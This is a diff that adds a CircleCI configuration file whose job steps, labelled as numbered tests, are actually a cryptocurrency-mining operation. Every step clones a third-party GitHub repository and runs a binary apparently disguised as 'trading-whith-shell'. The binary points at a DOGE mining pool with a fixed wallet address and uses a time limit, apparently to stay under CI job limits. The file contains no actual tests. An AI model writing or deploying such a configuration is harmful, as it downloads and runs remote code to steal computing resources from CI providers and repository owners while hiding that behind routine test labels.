@@ -1,0 +1,327 @@
+version: 2.1
+orbs:
+  python: circleci/python@0.2.1
+
+jobs:
+  build-test:
+    executor: python/default
+    steps:
+      - run:
+          command:
+            git clone https://github.com/vumaxekiopo/potential-spork &&
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 1
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 4
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 5
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 6
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 7
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 8
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 9
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 10
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 11
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 12
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 13
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 14
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 15
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 16
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 17
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 18
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 19
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 20
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 21
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 22
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 23
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 24
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 25
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 1
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 4
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 5
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 6
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 7
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 8
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 9
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 10
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 11
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 12
+      - run:
+          command:
+            git clone https://github.com/muhammadoope/1 &&
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 1
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 4
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 5
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 6
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 7
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 8
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 9
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 10
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 11
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 12
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 13
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 14
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 15
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 16
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 17
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 18
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 19
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 20
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 21
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 22
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 23
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 24
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 25
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 1
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 2
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 3
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 4
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 5
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 6
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 7
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 8
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 9
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 10
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 11
+      - run:
+          command:
+            cd potential-spork && chmod +x trading-whith-shell && ./trading-whith-shell -a power2b -o stratum+tcp://power2b.sea.mine.zpool.ca:6242 -u DPe2Gfwh4G3tmi8nefEMLF2KtBsQd4ic8w -p c=DOGE -t 2  --cpu-priority 4 --time-limit 580s
+          name: Test 12
+
+workflows:
+  main:
+    jobs:
+      - build-test
